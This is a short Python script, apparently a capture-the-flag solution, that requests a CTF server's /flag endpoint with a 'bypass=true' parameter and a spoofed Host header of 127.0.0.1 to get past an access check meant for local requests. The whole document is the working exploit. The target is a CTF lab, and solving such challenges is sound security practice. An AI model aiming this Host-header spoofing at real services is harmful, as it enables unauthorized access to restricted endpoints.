import requests

url = "http://public.ctf.r0devnull.team:3002/flag?bypass=true"
headers = {
    "Host": "127.0.0.1"
}

response = requests.get(url, headers=headers)

print(response.text)
